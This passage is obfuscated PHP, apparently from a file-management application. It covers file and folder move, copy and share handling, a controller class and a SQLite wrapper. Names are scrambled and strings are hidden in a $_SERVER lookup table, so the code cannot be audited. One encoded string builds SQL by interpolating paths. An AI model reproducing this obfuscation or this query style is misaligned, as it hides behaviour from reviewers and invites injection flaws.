$_SERVER[§ŒØóıü]; $É²´‹È¸ = $this->_childrenList($£¥ß”Š); $¤º•†ï = array_to_keyvalue($É²´‹È¸, $÷šíÏï—[12], $÷šíÏï—[32]); return $this->fileNameAutoGet($¤º•†ï, $úÉµÆçü, $”Áğ¸óë, $ç¤ôÎğ‰); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‘áÜ‹Õú, $Ç£òô, $€¤ÍŒÈÂ = REPEAT_REPLACE, $‘ôÍ—–± = '') { $¡àóê¬ß =& $_SERVER[§ŒØóıü]; $Æİ›É÷ = $this->sourceInfo($‘áÜ‹Õú); $Çèè¿ëî = $this->sourceInfo($Ç£òô); if ($Æİ›É÷[$¡àóê¬ß[432]] == $Çèè¿ëî[$¡àóê¬ß[402]]) { if ($Æİ›É÷[$¡àóê¬ß[431]] == $¡àóê¬ß[88]) { Model($¡àóê¬ß[429])->restore(array($‘áÜ‹Õú)); } if (!$‘ôÍ—–± || $‘ôÍ—–± == $Æİ›É÷[$¡àóê¬ß[32]]) { return $‘áÜ‹Õú; } } $¦øáØ”Ÿ = $this->pathInfoMore($‘áÜ‹Õú); if ($this->isParentOf($‘áÜ‹Õú, $Ç£òô)) { return !1; } if (!$Æİ›É÷ || !$Çèè¿ëî || $Çèè¿ëî[$¡àóê¬ß[410]] != $¡àóê¬ß[88]) { return !1; } Hook::trigger($¡àóê¬ß[586], $¦øáØ”Ÿ); $this->targetIsDelete = intval($Æİ›É÷[$¡àóê¬ß[431]]); if ($Æİ›É÷[$¡àóê¬ß[432]] == $Ç£òô && $‘ôÍ—–± != $Æİ›É÷[$¡àóê¬ß[32]]) { $˜˜Ğ±ã¯ = $this->fileNameExist($Ç£òô, $‘ôÍ—–±); if ($˜˜Ğ±ã¯ && $Æİ›É÷[$¡àóê¬ß[410]] == $¡àóê¬ß[198]) { $Ûç¢¶ã = $this->sourceInfo($˜˜Ğ±ã¯); $ÒÄ›Àİ = $this->fileHistory($Ûç¢¶ã, $Æİ›É÷[$¡àóê¬ß[468]], $Æİ›É÷[$¡àóê¬ß[76]]); if (!$ÒÄ›Àİ) { Model($¡àóê¬ß[471])->remove($Æİ›É÷[$¡àóê¬ß[468]]); } $this->removeNow($‘áÜ‹Õú, !1); $this->folderSizeReset($Ç£òô); Hook::trigger($¡àóê¬ß[587], $¦øáØ”Ÿ); return $˜˜Ğ±ã¯; } } $ºÕê»˜½ = $‘ôÍ—–± ? $‘ôÍ—–± : $Æİ›É÷[$¡àóê¬ß[32]]; $this->lockMoveStart($‘áÜ‹Õú); $this->lockWriteStart($Ç£òô, $ºÕê»˜½); $­œô‹ã¼ = array($¡àóê¬ß[557] => array(), $¡àóê¬ß[588] => !1); $this->clearShare($‘áÜ‹Õú, $Ç£òô); $’¼³Åî¸ = $this->fileNameExistCache($Ç£òô, $Æİ›É÷[$¡àóê¬ß[32]]); $ì»ô©– = $this->_move($‘áÜ‹Õú, $Ç£òô, $€¤ÍŒÈÂ, $­œô‹ã¼, $‘ôÍ—–±); $this->sourceCacheClear(); if ($Æİ›É÷[$¡àóê¬ß[410]] == $¡àóê¬ß[88] && $’¼³Åî¸) { $this->folderSizeResetChildren($ì»ô©–); } Model($¡àóê¬ß[200])->linkAdd($­œô‹ã¼[$¡àóê¬ß[557]]); if ($’¼³Åî¸ && $­œô‹ã¼[$¡àóê¬ß[588]]) { $this->removeNow($‘áÜ‹Õú, !1); } $this->lockMoveEnd($‘áÜ‹Õú); $this->lockWriteEnd($Ç£òô, $ºÕê»˜½); $this->folderSizeReset($Æİ›É÷[$¡àóê¬ß[432]]); $this->folderSizeReset($Ç£òô); $èĞ¯ å = array($Æİ›É÷[$¡àóê¬ß[432]], $Ç£òô); if ($Æİ›É÷[$¡àóê¬ß[410]] == $¡àóê¬ß[88]) { $èĞ¯ å[] = $‘áÜ‹Õú; } $this->updateModifyTime($èĞ¯ å); Model($¡àóê¬ß[561])->eventMove($‘áÜ‹Õú, $Æİ›É÷[$¡àóê¬ß[432]], $Ç£òô); Hook::trigger($¡àóê¬ß[587], $¦øáØ”Ÿ); return $ì»ô©–; } private function _move($š˜ŸŞù‰, $¯Îª¹„¢, $›ºø ¤ó, &$Ä™á¬÷†, $¤ÀõÂø„ = '') { $ø¯¿×Ö¡ =& $_SERVER[§ŒØóıü]; $êÔìË“ = $this->sourceInfo($š˜ŸŞù‰); $ËàŒ¯Ç™ = $êÔìË“[$ø¯¿×Ö¡[410]] == $ø¯¿×Ö¡[88]; $ÀìÖ­æª = $¤ÀõÂø„ ? $¤ÀõÂø„ : $êÔìË“[$ø¯¿×Ö¡[32]]; $úÀ¾ıˆ = $this->fileNameExistCache($¯Îª¹„¢, $ÀìÖ­æª); $this->lockMoveStart($š˜ŸŞù‰); $this->lockWriteStart($¯Îª¹„¢, $ÀìÖ­æª); if (!$úÀ¾ıˆ) { return $this->_moveForce($š˜ŸŞù‰, $¯Îª¹„¢, $ÀìÖ­æª); } $ËïÄÆĞ = $úÀ¾ıˆ; $ÖË„áÕ¥ = !1; if ($ËàŒ¯Ç™) { if ($›ºø ¤ó == REPEAT_RENAME_FOLDER) { $ÀìÖ­æª = $this->fileNameAuto($¯Îª¹„¢, $ÀìÖ­æª, $›ºø ¤ó, $ËàŒ¯Ç™); $ËïÄÆĞ = $this->_moveForce($š˜ŸŞù‰, $¯Îª¹„¢, $ÀìÖ­æª); } else { if ($›ºø ¤ó == REPEAT_RENAME_FOLDER) { $›ºø ¤ó = REPEAT_RENAME; } $¨äÉÑ‰ü = $this->_childrenListSelect($š˜ŸŞù‰); foreach ($¨äÉÑ‰ü as $ú†ìÎ‰ê) { $this->_move($ú†ìÎ‰ê[$ø¯¿×Ö¡[402]], $úÀ¾ıˆ, $›ºø ¤ó, $Ä™á¬÷†); } $ÖË„áÕ¥ = !0; } } else { if ($›ºø ¤ó == REPEAT_SKIP) { $ÖË„áÕ¥ = !0; } else { if ($›ºø ¤ó == REPEAT_RENAME || $›ºø ¤ó == REPEAT_RENAME_FOLDER) { $ÀìÖ­æª = $this->fileNameAuto($¯Îª¹„¢, $ÀìÖ­æª, $›ºø ¤ó, $ËàŒ¯Ç™); $ËïÄÆĞ = $this->_moveForce($š˜ŸŞù‰, $¯Îª¹„¢, $ÀìÖ­æª); } else { if ($›ºø ¤ó == REPEAT_REPLACE) { $êêÒÂØ = $this->sourceInfoCache($úÀ¾ıˆ); $ãÌÖñÎ… = $this->fileHistory($êêÒÂØ, $êÔìË“[$ø¯¿×Ö¡[468]], $êÔìË“[$ø¯¿×Ö¡[76]]); $ÖË„áÕ¥ = !0; if ($ãÌÖñÎ…) { $Ä™á¬÷†[$ø¯¿×Ö¡[557]][] = $êÔìË“[$ø¯¿×Ö¡[468]]; } } } } } if ($ÖË„áÕ¥ && !$Ä™á¬÷†[$ø¯¿×Ö¡[588]]) { $Ä™á¬÷†[$ø¯¿×Ö¡[588]] = !0; } return $ËïÄÆĞ; } private function _moveForce($÷ÌÜß², $—¾„¬Ëâ, $ÎÌğíÖ¥) { $†“­ä‚ =& $_SERVER[§ŒØóıü]; $ñİÊÛé– = $this->sourceInfo($÷ÌÜß²); $×„°ÇØò = $this->sourceInfo($—¾„¬Ëâ); $ò‚ù²š› = $ñİÊÛé–[$†“­ä‚[410]] == $†“­ä‚[88]; $•Àµ¹¥Õ = array($†“­ä‚[401] => $×„°ÇØò[$†“­ä‚[402]], $†“­ä‚[580] => $×„°ÇØò[$†“­ä‚[511]] . $×„°ÇØò[$†“­ä‚[402]] . $†“­ä‚[50], $†“­ä‚[576] => $×„°ÇØò[$†“­ä‚[411]], $†“­ä‚[577] => $×„°ÇØò[$†“­ä‚[496]], $†“­ä‚[579] => USER_ID, $†“­ä‚[420] => $ÎÌğíÖ¥); $ë¶®š = $ñİÊÛé–[$†“­ä‚[411]] == SourceModel::TYPE_GROUP && $×„°ÇØò[$†“­ä‚[411]] == SourceModel::TYPE_GROUP && $ñİÊÛé–[$†“­ä‚[496]] == $×„°ÇØò[$†“­ä‚[496]]; if (!$ë¶®š && $this->moveClearAuth) { Model($†“­ä‚[493])->authClear($÷ÌÜß²); } $Ğôµíš = $ñİÊÛé–[$†“­ä‚[431]] == $†“­ä‚[88] && $×„°ÇØò[$†“­ä‚[431]] != $†“­ä‚[88]; if ($Ğôµíš) { $•Àµ¹¥Õ[$†“­ä‚[430]] = 0; } if ($ò‚ù²š›) { $†®•Ò„¿ = array($†“­ä‚[580] => array($†“­ä‚[540], $ñİÊÛé–[$†“­ä‚[511]] . $ñİÊÛé–[$†“­ä‚[402]] . $†“­ä‚[541])); $ßÇ¦·‘ = $ñİÊÛé–[$†“­ä‚[511]] . $ñİÊÛé–[$†“­ä‚[402]] . $†“­ä‚[50]; $ß¬¤Ø’ = $×„°ÇØò[$†“­ä‚[511]] . $×„°ÇØò[$†“­ä‚[402]] . $†“­ä‚[50] . $ñİÊÛé–[$†“­ä‚[402]] . $†“­ä‚[50]; $ûœ‘Ç¢ˆ = array($†“­ä‚[580] => array($†“­ä‚[589], "\x72\145\160\x6c\141\x63\145\x28\160\141\x72\145\156\x74\114\145\x76\145\154\x2c\47{$ßÇ¦·‘}\47\54\47{$ß¬¤Ø’}\47\51"), $†“­ä‚[576] => $×„°ÇØò[$†“­ä‚[411]], $†“­ä‚[577] => $×„°ÇØò[$†“­ä‚[496]]); if ($Ğôµíš) { $ûœ‘Ç¢ˆ[$†“­ä‚[430]] = 0; } $this->where($†®•Ò„¿)->data($ûœ‘Ç¢ˆ)->save(); } $this->where(array($†“­ä‚[417] => $÷ÌÜß²))->data($•Àµ¹¥Õ)->save(); return $÷ÌÜß²; } private function clearShare($Â¬ÛõÔ£, $œëäÄÙ) { $»œ­“ûï =& $_SERVER[§ŒØóıü]; $İú¨ÈÈ = $this->sourceInfo($Â¬ÛõÔ£); $‘óÌ¶Ê× = $this->sourceInfo($œëäÄÙ); if ($İú¨ÈÈ[$»œ­“ûï[496]] == $‘óÌ¶Ê×[$»œ­“ûï[496]] && $İú¨ÈÈ[$»œ­“ûï[411]] == $»œ­“ûï[590]) { return; } $û½ÉÏ˜± = array($»œ­“ûï[511] => array($»œ­“ûï[540], $İú¨ÈÈ[$»œ­“ûï[511]] . $Â¬ÛõÔ£ . $»œ­“ûï[541])); $ÕÕšØõê = $this->field($»œ­“ûï[417])->where($û½ÉÏ˜±)->getField($»œ­“ûï[402], !0); if (!$ÕÕšØõê) { return; } $û½ÉÏ˜± = array($»œ­“ûï[402] => array($»œ­“ûï[7], $ÕÕšØõê), $»œ­“ûï[591] => 1); $ú¼Œ—²º = Model($»œ­“ûï[592])->field($»œ­“ûï[593])->where($û½ÉÏ˜±)->select(); if (!$ú¼Œ—²º) { return; } $ú¼Œ—²º = array_to_keyvalue($ú¼Œ—²º, $»œ­“ûï[12], $»œ­“ûï[593]); $û½ÉÏ˜± = array($»œ­“ûï[593] => array($»œ­“ûï[7], $ú¼Œ—²º)); Model($»œ­“ûï[592])->where($û½ÉÏ˜±)->save(array($»œ­“ûï[591] => 0)); Model($»œ­“ûï[594])->where($û½ÉÏ˜±)->delete(); } public function copyFolderFromIO($æ³©¬Şî, $‡¬­ûöñ, $œŠë‰Ñù, $ÇßÅÁ¨Ú, $ÑæÔ¼¸æ, $İå¢ÉŸ = false) { $å©è·©† =& $_SERVER[§ŒØóıü]; $Ï’å›´Ç = array($å©è·©†[558] => array(), $å©è·©†[559] => array(), $å©è·©†[557] => array(), $å©è·©†[595] => array()); $õÃ‹·ç‚ = $İå¢ÉŸ ? $İå¢ÉŸ : $æ³©¬Şî->pathThis($‡¬­ûöñ); $ˆ¦‰‰–« = $this->fileNameExist($œŠë‰Ñù, $õÃ‹·ç‚); $øòöÏÑÏ = $this->mkdir($œŠë‰Ñù, $õÃ‹·ç‚, $ÇßÅÁ¨Ú); if (!$ˆ¦‰‰–« || $ÇßÅÁ¨Ú == REPEAT_RENAME_FOLDER) { $ÇßÅÁ¨Ú = !1; } if ($ˆ¦‰‰–«) { $this->_childrenAllMake($ˆ¦‰‰–«); } Hook::trigger($å©è·©†[596]); $this->_copyChildTo($æ³©¬Şî, $‡¬­ûöñ, $øòöÏÑÏ, $ÇßÅÁ¨Ú, $Ï’å›´Ç, $ÑæÔ¼¸æ); Hook::trigger($å©è·©†[597]); if ($øòöÏÑÏ) { $this->folderSizeResetChildren($øòöÏÑÏ); } $this->_childrenListClear(); Model($å©è·©†[560])->addAll($Ï’å›´Ç[$å©è·©†[558]], array(), !0); Model($å©è·©†[561])->eventCopy($øòöÏÑÏ); $this->saveAll($Ï’å›´Ç[$å©è·©†[559]]); Model($å©è·©†[471])->linkAdd($Ï’å›´Ç[$å©è·©†[557]]); Model($å©è·©†[471])->remove($Ï’å›´Ç[$å©è·©†[595]]); $this->folderSizeReset($œŠë‰Ñù); $this->updateModifyTime($œŠë‰Ñù); return $øòöÏÑÏ; } private function _copyChildTo($ş±…ìáü, $œ˜°Æğ›, $šÛ•¶¦›, $µÏüØå³, &$·¹õº¸, $ó­Îæá¶) { $À¡É†¢Ù =& $_SERVER[§ŒØóıü]; $ÉÁŒŞÙï = $this->sourceInfoCache($šÛ•¶¦›); $Ø‚İ‹¡ê = $ş±…ìáü->listPath($œ˜°Æğ›); $Ø‚İ‹¡ê = $Ø‚İ‹¡ê ? $Ø‚İ‹¡ê : array($À¡É†¢Ù[83] => array(), $À¡É†¢Ù[82] => array()); $¤Ç¾Ù‘É = array_merge($Ø‚İ‹¡ê[$À¡É†¢Ù[83]], $Ø‚İ‹¡ê[$À¡É†¢Ù[82]]); $¼ÓìãÊ = $this->_addFiles($ş±…ìáü, $Ø‚İ‹¡ê[$À¡É†¢Ù[83]], $ó­Îæá¶); $ïŞ±„úÍ = array(); foreach ($¤Ç¾Ù‘É as &$Ä€íÔóÂ) { if (isset($¼ÓìãÊ[$Ä€íÔóÂ[$À¡É†¢Ù[32]]])) { $Ä€íÔóÂ = $¼ÓìãÊ[$Ä€íÔóÂ[$À¡É†¢Ù[32]]]; } $Ä€íÔóÂ[$À¡É†¢Ù[410]] = $Ä€íÔóÂ[$À¡É†¢Ù[33]] == $À¡É†¢Ù[75]; $Ä€íÔóÂ[$À¡É†¢Ù[412]] = substr(_get($Ä€íÔóÂ, $À¡É†¢Ù[174], $À¡É†¢Ù[12]), 0, 10); $Ä€íÔóÂ[$À¡É†¢Ù[76]] = _get($Ä€íÔóÂ, $À¡É†¢Ù[76], 0); $Ä€íÔóÂ[$À¡É†¢Ù[468]] = _get($Ä€íÔóÂ, $À¡É†¢Ù[468], 0); if (!isset($Ä€íÔóÂ[$À¡É†¢Ù[598]]) && $Ä€íÔóÂ[$À¡É†¢Ù[468]]) { $·¹õº¸[$À¡É†¢Ù[595]][] = $Ä€íÔóÂ[$À¡É†¢Ù[468]]; } if ($µÏüØå³) { $¹ºïç—† = $this->fileNameExistCache($šÛ•¶¦›, $Ä€íÔóÂ[$À¡É†¢Ù[32]]); if ($¹ºïç—†) { if ($Ä€íÔóÂ[$À¡É†¢Ù[410]] || $µÏüØå³ == REPEAT_SKIP) { continue; } if ($µÏüØå³ == REPEAT_REPLACE) { $Ãı€¹€ù = $this->sourceInfoCache($¹ºïç—†); $ıÕü„ƒ¡ = $this->fileHistory($Ãı€¹€ù, $Ä€íÔóÂ[$À¡É†¢Ù[468]], $Ä€íÔóÂ[$À¡É†¢Ù[76]]); if ($ıÕü„ƒ¡) { $·¹õº¸[$À¡É†¢Ù[557]][] = $Ä€íÔóÂ[$À¡É†¢Ù[468]]; } continue; } else { if ($µÏüØå³ == REPEAT_RENAME) { $Ä€íÔóÂ[$À¡É†¢Ù[32]] = $this->fileNameAutoCache($šÛ•¶¦›, $Ä€íÔóÂ[$À¡É†¢Ù[32]], $µÏüØå³, !1); } } } } if (!$Ä€íÔóÂ[$À¡É†¢Ù[410]] && $Ä€íÔóÂ[$À¡É†¢Ù[468]] == 0) { continue; } if (!$Ä€íÔóÂ[$À¡É†¢Ù[410]] && $Ä€íÔóÂ[$À¡É†¢Ù[468]]) { $·¹õº¸[$À¡É†¢Ù[557]][] = $Ä€íÔóÂ[$À¡É†¢Ù[468]]; } $ïŞ±„úÍ[] = $this->_makeItemData($Ä€íÔóÂ, $ÉÁŒŞÙï, $Ä€íÔóÂ[$À¡É†¢Ù[32]]); } unset($Ä€íÔóÂ); if (!empty($ïŞ±„úÍ)) { $this->addAll($ïŞ±„úÍ); $this->_childrenListSelect($šÛ•¶¦›); } $¢ùè… = $this->_childrenList($šÛ•¶¦›); $¢ùè… = array_to_keyvalue($¢ùè…, $À¡É†¢Ù[32]); foreach ($¤Ç¾Ù‘É as $Ä€íÔóÂ) { $Ãı€¹€ù = $¢ùè…[$Ä€íÔóÂ[$À¡É†¢Ù[32]]]; $ºÙ¸¦Ş = $Ãı€¹€ù[$À¡É†¢Ù[402]]; $this->_copyApplyMeta($Ãı€¹€ù, $·¹õº¸); if ($Ä€íÔóÂ[$À¡É†¢Ù[33]] == $À¡É†¢Ù[75]) { $Ä€íÔóÂ[$À¡É†¢Ù[84]] = $ş±…ìáü->getPathInner($Ä€íÔóÂ[$À¡É†¢Ù[84]]); $this->_copyChildTo($ş±…ìáü, $Ä€íÔóÂ[$À¡É†¢Ù[84]], $ºÙ¸¦Ş, $µÏüØå³, $·¹õº¸, $ó­Îæá¶); } } } private function _addFiles($°’äëğó, $Æ¬—ó–, $ƒü—úˆĞ) { $¼ü˜Ì¦ =& $_SERVER[§ŒØóıü]; if (!$Æ¬—ó– || count($Æ¬—ó–) == 0) { return array(); } $ä¹¼‘±– = array(); foreach ($Æ¬—ó– as &$º“ª¯‘°) { Hook::trigger($¼ü˜Ì¦[599], $º“ª¯‘°); $º“ª¯‘°[$¼ü˜Ì¦[84]] = $°’äëğó->getPathInner($º“ª¯‘°[$¼ü˜Ì¦[84]]); $•íÈë¬­ = $°’äëğó->hashSimple($º“ª¯‘°[$¼ü˜Ì¦[84]]); $­ÏØ¡ÌÎ = $°’äëğó->hashMd5($º“ª¯‘°[$¼ü˜Ì¦[84]]); if (strlen($­ÏØ¡ÌÎ) > 10 && !isset($ä¹¼‘±–[$­ÏØ¡ÌÎ])) { $ä¹¼‘±–[$­ÏØ¡ÌÎ] = array(); } $º“ª¯‘°[$¼ü˜Ì¦[177]] = $•íÈë¬­; $º“ª¯‘°[$¼ü˜Ì¦[176]] = $­ÏØ¡ÌÎ; $ä¹¼‘±–[$­ÏØ¡ÌÎ][] =& $º“ª¯‘°; if (count($ä¹¼‘±–[$­ÏØ¡ÌÎ]) > 1) { $º“ª¯‘°[$¼ü˜Ì¦[598]] = !0; } Hook::trigger($¼ü˜Ì¦[600], $º“ª¯‘°); } unset($º“ª¯‘°); $¡Çòß¤Ã = array($¼ü˜Ì¦[176] => array($¼ü˜Ì¦[7], array_keys($ä¹¼‘±–))); $âÊµªÙ› = Model($¼ü˜Ì¦[601]); $™Î‡¬£è = $âÊµªÙ›->where($¡Çòß¤Ã)->select(); $™Î‡¬£è = $™Î‡¬£è ? $™Î‡¬£è : array(); foreach ($™Î‡¬£è as $èğ²õ†İ) { if (!isset($ä¹¼‘±–[$èğ²õ†İ[$¼ü˜Ì¦[176]]])) { continue; } $€ªæüÙØ = $ä¹¼‘±–[$èğ²õ†İ[$¼ü˜Ì¦[176]]]; foreach ($€ªæüÙØ as &$º“ª¯‘°) { $º“ª¯‘°[$¼ü˜Ì¦[468]] = $èğ²õ†İ[$¼ü˜Ì¦[468]]; $º“ª¯‘°[$¼ü˜Ì¦[598]] = !0; } unset($º“ª¯‘°); } $ŠìËãô– = array(); foreach ($Æ¬—ó– as $‰¿Ê•®…) { Hook::trigger($¼ü˜Ì¦[602], $‰¿Ê•®…); if (isset($‰¿Ê•®…[$¼ü˜Ì¦[598]]) && $‰¿Ê•®…[$¼ü˜Ì¦[598]]) { Hook::trigger($¼ü˜Ì¦[603], $‰¿Ê•®…); continue; } $÷›–ÈªÎ = $°’äëğó->getPathInner($‰¿Ê•®…[$¼ü˜Ì¦[84]]); $£â×œ­ = $âÊµªÙ›->addFileMake($÷›–ÈªÎ, $‰¿Ê•®…[$¼ü˜Ì¦[76]], $‰¿Ê•®…[$¼ü˜Ì¦[177]], $‰¿Ê•®…[$¼ü˜Ì¦[176]], $‰¿Ê•®…[$¼ü˜Ì¦[32]], $ƒü—úˆĞ); Hook::trigger($¼ü˜Ì¦[603], $‰¿Ê•®…); if (!is_array($£â×œ­)) { continue; } $ŠìËãô–[] = $£â×œ­; } $âÊµªÙ›->addAll($ŠìËãô–); $¡Çòß¤Ã = array($¼ü˜Ì¦[176] => array($¼ü˜Ì¦[7], array_keys($ä¹¼‘±–))); $™Î‡¬£è = $âÊµªÙ›->where($¡Çòß¤Ã)->select(); $™Î‡¬£è = $™Î‡¬£è ? $™Î‡¬£è : array(); foreach ($™Î‡¬£è as $èğ²õ†İ) { if (!isset($ä¹¼‘±–[$èğ²õ†İ[$¼ü˜Ì¦[176]]])) { continue; } $™•ÊÁ =& $ä¹¼‘±–[$èğ²õ†İ[$¼ü˜Ì¦[176]]]; foreach ($™•ÊÁ as &$º“ª¯‘°) { $º“ª¯‘°[$¼ü˜Ì¦[468]] = $èğ²õ†İ[$¼ü˜Ì¦[468]]; } unset($º“ª¯‘°); } $²Êê¥¥î = array(); foreach ($Æ¬—ó– as $ƒ“ÒŒ«) { $²Êê¥¥î[$ƒ“ÒŒ«[$¼ü˜Ì¦[32]]] = $ƒ“ÒŒ«; } return $²Êê¥¥î; } } goto d’œÏ¥Ôñ£; f–¡£¾âĞ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $–Ãâ´­ˆ =& $_SERVER[§ŒØóıü]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$–Ãâ´­ˆ[6]] =& $config; $this->values[$–Ãâ´­ˆ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $–Ãâ´­ˆ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÕŠáæ¼÷) { if (1 === func_num_args()) { $this->{$ÕŠáæ¼÷} = new $ÕŠáæ¼÷(); } else { $”ÆÌ‡ñš = new ReflectionClass($ÕŠáæ¼÷); $Ô¼¼‘ñ¦ = func_get_args(); array_shift($Ô¼¼‘ñ¦); $this->{$ÕŠáæ¼÷} = $”ÆÌ‡ñš->newInstanceArgs($Ô¼¼‘ñ¦); } return $this->{$ÕŠáæ¼÷}; } public function routeBind($¡Öä¡òò, $Üøä”, $Ú·ÛÊ¢ù = 3) { $¡ä÷Šİ =& $_SERVER[§ŒØóıü]; $”Ğ‚’˜ = $this->in[$¡ä÷Šİ[9]]; $¡Öä¡òò = str_replace($¡ä÷Šİ[10], $¡ä÷Šİ[11], trim(trim($¡Öä¡òò, $¡ä÷Šİ[8]), $¡ä÷Šİ[12])); if (!$¡Öä¡òò || count($”Ğ‚’˜) <= $Ú·ÛÊ¢ù) { return !1; } $¹¦‚Ä“£ = !0; $ÆíÏ»µ’ = explode($¡ä÷Šİ[8], $¡Öä¡òò); for ($Æß¨‚š¼ = 0; $Æß¨‚š¼ < count($ÆíÏ»µ’); $Æß¨‚š¼++) { if ($ÆíÏ»µ’[$Æß¨‚š¼] != $”Ğ‚’˜[$Ú·ÛÊ¢ù + $Æß¨‚š¼]) { $¹¦‚Ä“£ = !1; break; } } if (!$¹¦‚Ä“£) { return; } call_user_func_array(array($this, $Üøä”), array()); } public function routeArgs($˜İÛË¦í = 3) { $òÀä¿²† = $this->in[$_SERVER[§ŒØóıü][9]]; if (count($òÀä¿²†) <= $˜İÛË¦í) { return array(); } $»¢ïØæ† = array(); for ($¬×êØ¢× = $˜İÛË¦í; $¬×êØ¢× < count($òÀä¿²†); $¬×êØ¢× += 2) { $»¢ïØæ†[$òÀä¿²†[$¬×êØ¢×]] = $òÀä¿²†[$¬×êØ¢× + 1]; $this->in[$òÀä¿²†[$¬×êØ¢×]] = $òÀä¿²†[$¬×êØ¢× + 1]; } return $»¢ïØæ†; } protected function assign($‹É—…ì, $¥¥Ğ¦Èí) { $this->values[$‹É—…ì] = $¥¥Ğ¦Èí; } protected function display($ş±ßã¶) { ob_end_clean(); extract($this->values); require $this->tpl . $ş±ßã¶; } } class DbSqliteBase extends Db { public function __construct($¦ÃóĞ¹• = '') { $…â·¡‚ =& $_SERVER[§ŒØóıü]; if (!extension_loaded($…â·¡‚[13])) { think_exception(think_lang($…â·¡‚[14]) . $…â·¡‚[15]); } if (!empty($¦ÃóĞ¹•)) { if (!isset($¦ÃóĞ¹•[$…â·¡‚[16]])) { $¦ÃóĞ¹•[$…â·¡‚[16]] = 438; } $this->config = $¦ÃóĞ¹•; if (empty($this->config[$…â·¡‚[17]])) { $this->config[$…â·¡‚[17]] = array(); } } } public function connect($¨ËŠ¸şğ = '', $©ôİÉñ° = 0) { $Ç‰şé¯ù =& $_SERVER[§ŒØóıü]; if (!isset($this->linkID[$©ôİÉñ°])) { if (empty($¨ËŠ¸şğ)) { $¨ËŠ¸şğ = $this->config; } $µØ‚—  = !empty($¨ËŠ¸şğ[$Ç‰şé¯ù[17]][$Ç‰şé¯ù[18]]) ? $¨ËŠ¸şğ[$Ç‰şé¯ù[17]][$Ç‰şé¯ù[18]] : $this->pconnect; $ä…¶´“¸ = $µØ‚—  ? $Ç‰şé¯ù[19] : $Ç‰şé¯ù[20]; $this->linkID[$©ôİÉñ°] = $ä…¶´“¸($¨ËŠ¸şğ[$Ç‰şé¯ù[21]], $¨ËŠ¸şğ[$Ç‰şé¯ù[16]]); if (!$this->linkID[$©ôİÉñ°]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$©ôİÉñ°], 30000); if (1 != think_config($Ç‰şé¯ù[22])) { unset($this->config); } } return $this->linkID[$©ôİÉñ°]; } public function free() { $this->queryID = null; } public function query($½‹åãèò) { $¶˜‹äÖÓ =& $_SERVER[§ŒØóıü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½‹åãèò; if ($this->queryID) { $this->free(); } think_action_status($¶˜‹äÖÓ[23], 1); think_status($¶˜‹äÖÓ[24]); $this->queryID = sqlite_query($this->_linkID, $½‹åãèò); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‚§Œº¡Ÿ = $this->getAll(); return $‚§Œº¡Ÿ; } } public function execute($Ş»ì´œµ) { $İØïòë¹ =& $_SERVER[§ŒØóıü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ş»ì´œµ; if ($this->queryID) { $this->free(); } think_action_status($İØïòë¹[25], 1); think_status($İØïòë¹[24]); $Ğë™è×÷ = sqlite_exec($this->_linkID, $Ş»ì´œµ); $this->debug(); if (!1 === $Ğë™è×÷) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[§ŒØóıü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡»†—Ü¶ = sqlite_query($this->_linkID, $_SERVER[§ŒØóıü][27]); if (!$¡»†—Ü¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $°ŞÔ“» = sqlite_query($this->_linkID, $_SERVER[§ŒØóıü][28]); if (!$°ŞÔ“») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¼¨° †ß = array(); if ($this->numRows > 0) { for ($§Ùî­Ü² = 0; $§Ùî­Ü² < $this->numRows; $§Ùî­Ü²++) { $¼¨° †ß[$§Ùî­Ü²] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¼¨° †ß; } public function getFields($ËŠŸ¹—) { $ì©­¦éÆ =& $_SERVER[§ŒØóıü]; $´öçŞ = $this->query($ì©­¦éÆ[29] . $ËŠŸ¹— . $ì©­¦éÆ[30]); $İçüÂÎ = array(); if ($´öçŞ) { foreach ($´öçŞ as $ê´ê´Œ­ => $•®ù¼Š³) { $İçüÂÎ[$•®ù¼Š³[$ì©­¦éÆ[31]]] = array($ì©­¦éÆ[32] => $•®ù¼Š³[$ì©­¦éÆ[31]], $ì©­¦éÆ[33] => $•®ù¼Š³[$ì©­¦éÆ[34]], $ì©­¦éÆ[35] => (bool) ($•®ù¼Š³[$ì©­¦éÆ[36]] === $ì©­¦éÆ[12]), $ì©­¦éÆ[37] => $•®ù¼Š³[$ì©­¦éÆ[38]], $ì©­¦éÆ[39] => strtolower($•®ù¼Š³[$ì©­¦éÆ[40]]) == $ì©­¦éÆ[41], $ì©­¦éÆ[42] => strtolower($•®ù¼Š³[$ì©­¦éÆ[43]]) == $ì©­¦éÆ[44]); } } return $İçüÂÎ; } public function getTables($¶Èœˆ×õ = '') { $ ŠÁù—¯ =& $_SERVER[§ŒØóıü]; $ìÃ§”ùæ = $this->query($ ŠÁù—¯[45] . $ ŠÁù—¯[46] . $ ŠÁù—¯[47]); $ğ¢¹ğ¦¹ = array(); foreach ($ìÃ§”ùæ as $Š’×¿™ => $ê÷¾á’Ö) { $ğ¢¹ğ¦¹[$Š’×¿™] = current($ê÷¾á’Ö); } return $ğ¢¹ğ¦¹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÈÓãßå =& $_SERVER[§ŒØóıü]; $şüì¨ğ = sqlite_last_error($this->_linkID); $this->error = $şüì¨ğ . $ÈÓãßå[4] 